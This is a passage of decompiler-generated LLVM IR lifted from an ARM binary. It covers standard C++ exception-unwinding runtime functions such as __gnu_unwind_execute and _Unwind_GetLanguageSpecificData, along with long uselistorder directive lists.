  %v3_19eb8 = add i32 %tmp, 4
  %v4_19eb8 = inttoptr i32 %v3_19eb8 to i32*
  %v5_19eb8 = load i32, i32* %v4_19eb8, align 4
  store i32 %v5_19eb8, i32* @r1, align 4
  %v12_19eb8 = add i32 %tmp, 16
  %v13_19eb8 = inttoptr i32 %v12_19eb8 to i32*
  %v14_19eb8 = load i32, i32* %v13_19eb8, align 4
  store i32 %v14_19eb8, i32* @r4, align 4
  %v15_19eb8 = add i32 %tmp, 20
  %v16_19eb8 = inttoptr i32 %v15_19eb8 to i32*
  %v17_19eb8 = load i32, i32* %v16_19eb8, align 4
  store i32 %v17_19eb8, i32* @r5, align 4
  %v18_19eb8 = add i32 %tmp, 24
  %v19_19eb8 = inttoptr i32 %v18_19eb8 to i32*
  %v20_19eb8 = load i32, i32* %v19_19eb8, align 4
  store i32 %v20_19eb8, i32* @r6, align 4
  %v21_19eb8 = add i32 %tmp, 28
  %v22_19eb8 = inttoptr i32 %v21_19eb8 to i32*
  %v23_19eb8 = load i32, i32* %v22_19eb8, align 4
  store i32 %v23_19eb8, i32* @r7, align 4
  %v24_19eb8 = add i32 %tmp, 32
  %v25_19eb8 = inttoptr i32 %v24_19eb8 to i32*
  %v26_19eb8 = load i32, i32* %v25_19eb8, align 4
  store i32 %v26_19eb8, i32* @r8, align 4
  %v27_19eb8 = add i32 %tmp, 36
  %v28_19eb8 = inttoptr i32 %v27_19eb8 to i32*
  %v29_19eb8 = load i32, i32* %v28_19eb8, align 4
  store i32 %v29_19eb8, i32* @sb, align 4
  %v30_19eb8 = add i32 %tmp, 40
  %v31_19eb8 = inttoptr i32 %v30_19eb8 to i32*
  %v32_19eb8 = load i32, i32* %v31_19eb8, align 4
  store i32 %v32_19eb8, i32* @sl, align 4
  store i32 %v8_19eac, i32* @ip, align 4
  store i32 %v5_19eac, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_19eac)
  ret i32 %v2_19eb8

; uselistorder directives
  uselistorder i32 %v8_19eac, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 70, 71, 72, 73, 16, 17, 6, 7, 1, 76, 8, 74, 75, 14, 15, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 2, 110, 111, 112, 113, 114, 115, 116, 117, 118, 9, 119, 120, 121, 32, 33, 22, 23, 3, 24, 25, 26, 27, 34, 35, 10, 36, 37, 11, 38, 12, 21, 13, 39, 40, 41, 42, 0, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 4, 18, 19, 20, 28, 29, 30, 31, 61, 62, 63, 64, 65, 66, 67, 5, 68, 69 }
  uselistorder i32 40, { 30, 26, 27, 28, 29, 11, 31, 2, 12, 4, 5, 1, 6, 3, 13, 14, 7, 15, 16, 17, 18, 19, 20, 22, 21, 0, 8, 23, 9, 24, 10, 25 }
  uselistorder i32* @sb, { 115, 116, 117, 2, 3, 4, 5, 91, 92, 93, 94, 95, 96, 97, 98, 103, 106, 104, 105, 107, 80, 81, 65, 66, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 23, 24, 19, 20, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 1, 56, 57, 58, 59, 60, 61, 62, 63, 64, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 82, 83, 84, 85, 86, 87, 88, 89, 90, 99, 100, 101, 102, 108, 109, 110, 111, 112, 113, 114 }
  uselistorder i32 36, { 17, 16, 4, 18, 6, 7, 5, 13, 15, 8, 14, 9, 0, 1, 2, 3, 10, 11, 12 }
  uselistorder i32* @r8, { 279, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 1, 278, 0, 38, 280, 9, 281, 39, 40, 41, 42, 25, 26, 27, 28, 29, 30, 31, 32, 33, 3, 34, 35, 36, 37, 43, 44, 45, 46, 10, 282, 11, 12, 13, 22, 23, 4, 24, 179, 180, 5, 181, 182, 183, 211, 212, 213, 214, 215, 7, 216, 217, 218, 219, 220, 221, 222, 223, 14, 165, 166, 167, 168, 224, 225, 226, 227, 228, 15, 146, 147, 148, 149, 229, 230, 231, 232, 91, 92, 93, 94, 95, 233, 234, 235, 236, 96, 97, 98, 99, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 17, 18, 19, 20, 21, 16, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 84, 81, 82, 83, 85, 86, 87, 88, 89, 90, 100, 101, 102, 103, 104, 105, 106, 107, 108, 112, 109, 110, 111, 113, 114, 115, 116, 117, 119, 118, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 169, 170, 2, 174, 171, 172, 173, 175, 176, 177, 178, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 208, 205, 206, 207, 8, 209, 210, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 6, 257, 258, 259, 260 }
  uselistorder i32 32, { 110, 107, 108, 109, 65, 111, 112, 61, 79, 113, 60, 103, 66, 62, 92, 90, 91, 87, 88, 89, 96, 97, 93, 94, 81, 67, 101, 102, 104, 1, 2, 4, 3, 105, 6, 5, 8, 7, 10, 9, 82, 63, 68, 64, 106, 69, 95, 12, 11, 14, 13, 70, 83, 71, 84, 72, 85, 73, 86, 16, 15, 18, 17, 80, 20, 19, 21, 23, 22, 25, 24, 26, 27, 29, 28, 74, 75, 98, 30, 99, 31, 100, 32, 33, 34, 35, 36, 37, 76, 38, 39, 40, 77, 41, 0, 42, 43, 44, 46, 45, 48, 47, 50, 49, 51, 53, 52, 55, 54, 57, 56, 58, 59, 78 }
  uselistorder i32 28, { 48, 11, 32, 49, 29, 50, 51, 52, 53, 7, 33, 34, 30, 31, 38, 12, 35, 13, 45, 46, 47, 8, 14, 0, 19, 1, 20, 2, 21, 3, 22, 4, 23, 5, 24, 15, 25, 16, 26, 17, 27, 6, 28, 9, 18, 37, 36, 39, 40, 41, 42, 43, 44, 10 }
  uselistorder i32 24, { 107, 106, 108, 12, 13, 109, 0, 65, 66, 67, 68, 69, 70, 63, 64, 14, 71, 72, 82, 83, 73, 74, 8, 15, 100, 101, 102, 105, 1, 84, 85, 86, 41, 42, 9, 75, 76, 49, 77, 60, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54, 16, 55, 17, 56, 18, 57, 58, 59, 61, 62, 78, 79, 80, 81, 19, 20, 21, 22, 2, 23, 24, 10, 87, 88, 25, 26, 3, 27, 89, 28, 29, 30, 11, 90, 31, 32, 33, 91, 34, 4, 92, 93, 94, 95, 35, 36, 96, 37, 97, 38, 5, 98, 6, 39, 99, 103, 40, 104, 7, 43 }
  uselistorder i32 20, { 124, 122, 123, 125, 1, 4, 11, 34, 126, 30, 127, 128, 129, 130, 5, 131, 132, 2, 133, 35, 12, 31, 32, 33, 36, 37, 38, 48, 49, 39, 40, 134, 107, 108, 109, 110, 111, 112, 113, 13, 114, 115, 117, 3, 50, 14, 51, 52, 0, 24, 42, 43, 15, 44, 16, 45, 23, 41, 46, 47, 53, 55, 6, 54, 56, 57, 58, 59, 60, 61, 7, 62, 63, 64, 65, 66, 67, 69, 70, 17, 68, 71, 72, 73, 74, 75, 76, 78, 79, 18, 77, 80, 81, 82, 83, 85, 86, 19, 84, 87, 88, 89, 90, 91, 92, 94, 20, 93, 95, 96, 97, 100, 8, 98, 21, 99, 101, 102, 105, 9, 103, 22, 104, 106, 116, 25, 26, 27, 28, 29, 118, 119, 120, 10, 121 }
  uselistorder i32* @r1, { 189, 15, 16, 17, 4, 190, 191, 63, 64, 80, 43, 2, 193, 44, 192, 136, 45, 46, 47, 18, 65, 1, 66, 67, 19, 196, 20, 5, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 6, 214, 215, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 69, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 3, 79, 25, 138, 95, 96, 216, 21, 218, 219, 220, 221, 101, 102, 29, 82, 30, 217, 22, 31, 139, 140, 127, 128, 129, 130, 131, 132, 133, 42, 141, 7, 134, 135, 8, 142, 145, 143, 9, 144, 83, 84, 23, 146, 147, 148, 137, 120, 121, 12, 32, 33, 34, 35, 36, 37, 38, 10, 224, 225, 226, 227, 0, 228, 24, 81, 97, 149, 222, 223, 150, 26, 194, 195, 27, 13, 85, 98, 151, 152, 28, 153, 154, 86, 87, 39, 40, 41, 88, 89, 90, 91, 92, 122, 93, 94, 14, 99, 100, 123, 124, 11, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 125, 126, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188 }
  uselistorder i32 60, { 3, 25, 26, 27, 4, 5, 1, 6, 18, 19, 20, 21, 22, 23, 7, 14, 15, 8, 16, 17, 9, 10, 0, 11, 12, 13, 2, 24 }
  uselistorder i32 56, { 3, 37, 38, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 15, 14, 2, 16, 17, 18, 19, 20, 34, 35, 31, 32, 4, 5, 1, 6, 0, 7, 33, 36, 8, 11, 9, 12, 10, 13 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19ec8 = load i32, i32* @r0, align 4
  ret i32 %v1_19ec8
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19ed0 = load i32, i32* @r0, align 4
  ret i32 %v1_19ed0
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19ee4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_19ee8 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_19ee4, i32 0)
  ret i32 %v2_19ee8

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19f08 = ptrtoint i32* %stack_var_-68 to i32
  %v2_19f0c = call i32 @__gnu_Unwind_Resume(i32 %v2_19f08, i32 0)
  ret i32 %v2_19f0c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19f2c = ptrtoint i32* %stack_var_-68 to i32
  %v2_19f30 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_19f2c, i32 0)
  ret i32 %v2_19f30

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19f50 = ptrtoint i32* %stack_var_-68 to i32
  %v6_19f54 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_19f50, i32 %arg2, i8* %arg3, i32 %v2_19f50)
  ret i32 %v6_19f54

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_19f80 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_19f88 = add i32 %tmp1, 76
  %v2_19f88 = inttoptr i32 %v1_19f88 to i32*
  %v3_19f88 = load i32, i32* %v2_19f88, align 4
  %v1_19f8c = add i32 %v3_19f88, 7
  %v2_19f8c = inttoptr i32 %v1_19f8c to i8*
  %v3_19f8c = load i8, i8* %v2_19f8c, align 1
  %v4_19f8c = zext i8 %v3_19f8c to i32
  %v1_19f90 = add i32 %v3_19f88, 8
  %v3_19f94 = mul nuw nsw i32 %v4_19f8c, 4
  %v2_19f98 = add i32 %v3_19f94, %v1_19f90
  %v3_19f98 = inttoptr i32 %v2_19f98 to i8*
  ret i8* %v3_19f98
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_19fa8 = load i32, i32* @r6, align 4
  %v21_19fa8 = load i32, i32* @lr, align 4
  %v0_19fac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_19fac, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_19fbc

dec_label_pc_19fbc:                               ; preds = %dec_label_pc_19fbc.backedge, %entry
  %v3_19fc8 = phi i32 [ %v0_19fbc.pre, %dec_label_pc_19fbc.backedge ], [ %tmp, %entry ]
  %v1_19fbc = add i32 %v3_19fc8, 8
  %v2_19fbc = inttoptr i32 %v1_19fbc to i8*
  %v3_19fbc = load i8, i8* %v2_19fbc, align 1
  %v4_19fbc = zext i8 %v3_19fbc to i32
  store i32 %v4_19fbc, i32* %r3.global-to-local, align 4
  %v2_19fc0 = icmp eq i8 %v3_19fbc, 0
  store i1 %v2_19fc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19fc0, label %dec_label_pc_19fd0, label %.thread

.thread:                                          ; preds = %dec_label_pc_19fbc
  %v2_19fc4 = add nsw i32 %v4_19fbc, -1
  store i32 %v2_19fc4, i32* %r3.global-to-local, align 4
  %v2_19fc8 = trunc i32 %v2_19fc4 to i8
  store i8 %v2_19fc8, i8* %v2_19fbc, align 1
  %v0_19fcc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19fcc.pr.pr, label %.thread.dec_label_pc_19fd0_crit_edge, label %dec_label_pc_19ff8

.thread.dec_label_pc_19fd0_crit_edge:             ; preds = %.thread
  %v0_19fd0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19fd0

dec_label_pc_19fd0:                               ; preds = %.thread.dec_label_pc_19fd0_crit_edge, %dec_label_pc_19fbc
  %v0_19fd0 = phi i32 [ %v0_19fd0.pre, %.thread.dec_label_pc_19fd0_crit_edge ], [ %v3_19fc8, %dec_label_pc_19fbc ]
  %v1_19fd0 = add i32 %v0_19fd0, 9
  %v2_19fd0 = inttoptr i32 %v1_19fd0 to i8*
  %v3_19fd0 = load i8, i8* %v2_19fd0, align 1
  %v4_19fd0 = zext i8 %v3_19fd0 to i32
  store i32 %v4_19fd0, i32* %r3.global-to-local, align 4
  %v2_19fd4 = icmp eq i8 %v3_19fd0, 0
  store i1 %v2_19fd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19fd4, label %dec_label_pc_1a0d8, label %dec_label_pc_19fdc

dec_label_pc_19fdc:                               ; preds = %dec_label_pc_1a0cc, %dec_label_pc_19fd0
  %v2_19fe0 = phi i32 [ %v0_1a0cc, %dec_label_pc_1a0cc ], [ %v0_19fd0, %dec_label_pc_19fd0 ]
  %v0_19fdc = phi i32 [ %v4_1a0cc, %dec_label_pc_1a0cc ], [ %v4_19fd0, %dec_label_pc_19fd0 ]
  %v1_19fdc = add nsw i32 %v0_19fdc, -1
  store i32 %v1_19fdc, i32* %r3.global-to-local, align 4
  %v1_19fe0 = trunc i32 %v1_19fdc to i8
  %v3_19fe0 = add i32 %v2_19fe0, 9
  %v4_19fe0 = inttoptr i32 %v3_19fe0 to i8*
  store i8 %v1_19fe0, i8* %v4_19fe0, align 1
  %v0_19fe4 = load i32, i32* @r5, align 4
  %v1_19fe4 = add i32 %v0_19fe4, 4
  %v2_19fe4 = inttoptr i32 %v1_19fe4 to i32*
  %v3_19fe4 = load i32, i32* %v2_19fe4, align 4
  store i32 %v3_19fe4, i32* %r2.global-to-local, align 4
  %v1_19fe8 = inttoptr i32 %v3_19fe4 to i32*
  %v2_19fe8 = load i32, i32* %v1_19fe8, align 4
  store i32 %v2_19fe8, i32* %r0.global-to-local, align 4
  %v4_19fe8 = add i32 %v3_19fe4, 4
  store i32 %v4_19fe8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_19ff0 = inttoptr i32 %v0_19fe4 to i32*
  store i32 %v2_19fe8, i32* %v1_19ff0, align 4
  %v5_19ff0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19ff0, i32* %v2_19fe4, align 4
  %v0_19ff4 = load i32, i32* %r3.global-to-local, align 4
  %v1_19ff4 = trunc i32 %v0_19ff4 to i8
  %v2_19ff4 = load i32, i32* @r5, align 4
  %v3_19ff4 = add i32 %v2_19ff4, 8
  %v4_19ff4 = inttoptr i32 %v3_19ff4 to i8*
  store i8 %v1_19ff4, i8* %v4_19ff4, align 1
  br label %dec_label_pc_19ff8

dec_label_pc_19ff8:                               ; preds = %.thread, %dec_label_pc_19fdc, %.thread6
  %v0_19ff8 = load i32, i32* @r5, align 4
  %v1_19ff8 = inttoptr i32 %v0_19ff8 to i32*
  %v2_19ff8 = load i32, i32* %v1_19ff8, align 4
  %v3_19ffc = udiv i32 %v2_19ff8, 16777216
  store i32 %v3_19ffc, i32* @r4, align 4
  store i32 %v3_19ffc, i32* %ip.global-to-local, align 4
  %v3_1a004 = mul i32 %v2_19ff8, 256
  store i32 %v3_1a004, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_19ff8, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_1a004, i32* %v1_19ff8, align 4
  br i1 %tmp183, label %dec_label_pc_1a0d8, label %dec_label_pc_1a014

dec_label_pc_1a014:                               ; preds = %dec_label_pc_19ff8
  %v0_1a014 = load i32, i32* @r4, align 4
  %v1_1a014 = and i32 %v0_1a014, 128
  store i32 %v1_1a014, i32* %r1.global-to-local, align 4
  %v2_1a014 = icmp eq i32 %v1_1a014, 0
  store i1 %v2_1a014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a014, label %dec_label_pc_1a0f0, label %dec_label_pc_1a01c

dec_label_pc_1a01c:                               ; preds = %dec_label_pc_1a014
  %v1_1a01c = and i32 %v0_1a014, 240
  store i32 %v1_1a01c, i32* @r6, align 4
  %v7_1a020 = icmp eq i32 %v1_1a01c, 128
  store i1 %v7_1a020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a020, label %dec_label_pc_1a028, label %dec_label_pc_1a14c

dec_label_pc_1a028:                               ; preds = %dec_label_pc_1a01c
  %v0_1a028 = load i32, i32* @r5, align 4
  %v1_1a028 = add i32 %v0_1a028, 8
  %v2_1a028 = inttoptr i32 %v1_1a028 to i8*
  %v3_1a028 = load i8, i8* %v2_1a028, align 1
  %v4_1a028 = zext i8 %v3_1a028 to i32
  store i32 %v4_1a028, i32* %r3.global-to-local, align 4
  %v2_1a02c = icmp eq i8 %v3_1a028, 0
  store i1 %v2_1a02c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a02c, label %dec_label_pc_1a03c, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1a028
  %v2_1a030 = add nsw i32 %v4_1a028, -1
  store i32 %v2_1a030, i32* %r3.global-to-local, align 4
  %v2_1a034 = trunc i32 %v2_1a030 to i8
  store i8 %v2_1a034, i8* %v2_1a028, align 1
  %v0_1a038.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a038.pr.pr, label %.thread3.dec_label_pc_1a03c_crit_edge, label %dec_label_pc_1a06c

.thread3.dec_label_pc_1a03c_crit_edge:            ; preds = %.thread3
  %v0_1a03c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a03c

dec_label_pc_1a03c:                               ; preds = %.thread3.dec_label_pc_1a03c_crit_edge, %dec_label_pc_1a028
  %v2_1a050 = phi i32 [ %v0_1a03c.pre, %.thread3.dec_label_pc_1a03c_crit_edge ], [ %v0_1a028, %dec_label_pc_1a028 ]
  %v1_1a03c = add i32 %v2_1a050, 9
  %v2_1a03c = inttoptr i32 %v1_1a03c to i8*
  %v3_1a03c = load i8, i8* %v2_1a03c, align 1
  %v4_1a03c = zext i8 %v3_1a03c to i32
  store i32 %v4_1a03c, i32* %r3.global-to-local, align 4
  %v2_1a040 = icmp eq i8 %v3_1a03c, 0
  store i1 %v2_1a040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a040, label %dec_label_pc_1a07c, label %dec_label_pc_1a04c

dec_label_pc_1a04c:                               ; preds = %dec_label_pc_1a03c
  %v1_1a04c = add nsw i32 %v4_1a03c, -1
  store i32 %v1_1a04c, i32* %r3.global-to-local, align 4
  %v1_1a050 = trunc i32 %v1_1a04c to i8
  store i8 %v1_1a050, i8* %v2_1a03c, align 1
  %v0_1a054 = load i32, i32* @r5, align 4
  %v1_1a054 = add i32 %v0_1a054, 4
  %v2_1a054 = inttoptr i32 %v1_1a054 to i32*
  %v3_1a054 = load i32, i32* %v2_1a054, align 4
  store i32 %v3_1a054, i32* %r2.global-to-local, align 4
  %v1_1a058 = inttoptr i32 %v3_1a054 to i32*
  %v2_1a058 = load i32, i32* %v1_1a058, align 4
  store i32 %v2_1a058, i32* %r0.global-to-local, align 4
  %v4_1a058 = add i32 %v3_1a054, 4
  store i32 %v4_1a058, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a058, i32* %v2_1a054, align 4
  %v0_1a064 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a064 = trunc i32 %v0_1a064 to i8
  %v2_1a064 = load i32, i32* @r5, align 4
  %v3_1a064 = add i32 %v2_1a064, 8
  %v4_1a064 = inttoptr i32 %v3_1a064 to i8*
  store i8 %v1_1a064, i8* %v4_1a064, align 1
  %v0_1a068 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a068 = load i32, i32* @r5, align 4
  %v2_1a068 = inttoptr i32 %v1_1a068 to i32*
  store i32 %v0_1a068, i32* %v2_1a068, align 4
  br label %dec_label_pc_1a06c

dec_label_pc_1a06c:                               ; preds = %.thread3, %dec_label_pc_1a04c
  %v0_1a06c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a06c, i32* %r3.global-to-local, align 4
  %v3_1a070 = mul i32 %v0_1a06c, 256
  store i32 %v3_1a070, i32* %r0.global-to-local, align 4
  %v1_1a074 = load i32, i32* @r5, align 4
  %v2_1a074 = inttoptr i32 %v1_1a074 to i32*
  store i32 %v3_1a070, i32* %v2_1a074, align 4
  %v0_1a078 = load i32, i32* %r3.global-to-local, align 4
  %v3_1a078 = udiv i32 %v0_1a078, 16777216
  br label %dec_label_pc_1a07c

dec_label_pc_1a07c:                               ; preds = %dec_label_pc_1a03c, %dec_label_pc_1a06c
  %storemerge133 = phi i32 [ %v3_1a078, %dec_label_pc_1a06c ], [ 176, %dec_label_pc_1a03c ]
  %v1_1a07c = load i32, i32* %ip.global-to-local, align 4
  %v4_1a07c = mul i32 %v1_1a07c, 256
  %v5_1a07c = or i32 %v4_1a07c, %storemerge133
  store i32 %v5_1a07c, i32* %r2.global-to-local, align 4
  %v7_1a080 = icmp eq i32 %v5_1a07c, 32768
  store i1 %v7_1a080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a080, label %dec_label_pc_1a28c, label %dec_label_pc_1a088

dec_label_pc_1a088:                               ; preds = %dec_label_pc_1a07c
  %v3_1a088 = mul i32 %v5_1a07c, 16
  store i32 %v3_1a088, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_1a098 = and i32 %v3_1a088, 65520
  store i32 %v3_1a098, i32* %r2.global-to-local, align 4
  %v0_1a09c = load i32, i32* @r7, align 4
  store i32 %v0_1a09c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_1a0a4 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a09c, i32 %v3_1a098, i32 0, i32 0)
  store i32 %v4_1a0a4, i32* %r0.global-to-local, align 4
  %v2_1a0a8 = icmp eq i32 %v4_1a0a4, 0
  store i1 %v2_1a0a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0a8, label %dec_label_pc_1a0b0, label %dec_label_pc_1a28c

dec_label_pc_1a0b0:                               ; preds = %dec_label_pc_1a088
  %v0_1a0b0 = load i32, i32* @r5, align 4
  %v1_1a0b0 = add i32 %v0_1a0b0, 8
  %v2_1a0b0 = inttoptr i32 %v1_1a0b0 to i8*
  %v3_1a0b0 = load i8, i8* %v2_1a0b0, align 1
  %v4_1a0b0 = zext i8 %v3_1a0b0 to i32
  store i32 %v4_1a0b0, i32* %r3.global-to-local, align 4
  %v0_1a0b4 = load i32, i32* @r4, align 4
  %v1_1a0b4 = and i32 %v0_1a0b4, 32768
  %v2_1a0b4 = icmp eq i32 %v1_1a0b4, 0
  store i1 %v2_1a0b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0b4, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_1a0b0
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_1a0b0, %bb147
  %v2_1a0bc = icmp eq i8 %v3_1a0b0, 0
  store i1 %v2_1a0bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0bc, label %dec_label_pc_1a0cc, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_1a0c0 = add nsw i32 %v4_1a0b0, -1
  store i32 %v2_1a0c0, i32* %r3.global-to-local, align 4
  %v2_1a0c4 = trunc i32 %v2_1a0c0 to i8
  store i8 %v2_1a0c4, i8* %v2_1a0b0, align 1
  %v0_1a0c8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a0c8.pr.pr, label %.thread6.dec_label_pc_1a0cc_crit_edge, label %dec_label_pc_19ff8

.thread6.dec_label_pc_1a0cc_crit_edge:            ; preds = %.thread6
  %v0_1a0cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a0cc

dec_label_pc_1a0cc:                               ; preds = %bb148, %.thread6.dec_label_pc_1a0cc_crit_edge
  %v0_1a0cc = phi i32 [ %v0_1a0cc.pre, %.thread6.dec_label_pc_1a0cc_crit_edge ], [ %v0_1a0b0, %bb148 ]
  %v1_1a0cc = add i32 %v0_1a0cc, 9
  %v2_1a0cc = inttoptr i32 %v1_1a0cc to i8*
  %v3_1a0cc = load i8, i8* %v2_1a0cc, align 1
  %v4_1a0cc = zext i8 %v3_1a0cc to i32
  store i32 %v4_1a0cc, i32* %r3.global-to-local, align 4
  %v2_1a0d0 = icmp eq i8 %v3_1a0cc, 0
  store i1 %v2_1a0d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0d0, label %dec_label_pc_1a0d8, label %dec_label_pc_19fdc

dec_label_pc_1a0d8:                               ; preds = %dec_label_pc_1a0cc, %dec_label_pc_19fd0, %dec_label_pc_19ff8
  %v0_1a0d8 = load i32, i32* @sl, align 4
  %v2_1a0d8 = icmp eq i32 %v0_1a0d8, 0
  store i1 %v2_1a0d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0d8, label %dec_label_pc_1a1a0, label %bb149

bb149:                                            ; preds = %dec_label_pc_1a0d8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0e4

dec_label_pc_1a0e4:                               ; preds = %bb149, %dec_label_pc_1a654, %dec_label_pc_1a4f4, %dec_label_pc_1a318, %dec_label_pc_1a2d0, %dec_label_pc_1a28c, %dec_label_pc_1a1a0
  %v1_1a0ec = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_1a654 ], [ 9, %dec_label_pc_1a4f4 ], [ 9, %dec_label_pc_1a318 ], [ 9, %dec_label_pc_1a2d0 ], [ 9, %dec_label_pc_1a28c ], [ %v0_1a1d4, %dec_label_pc_1a1a0 ]
  store i32 %v9_19fa8, i32* %r6.global-to-local, align 4
  store i32 %v21_19fa8, i32* @lr, align 4
  ret i32 %v1_1a0ec

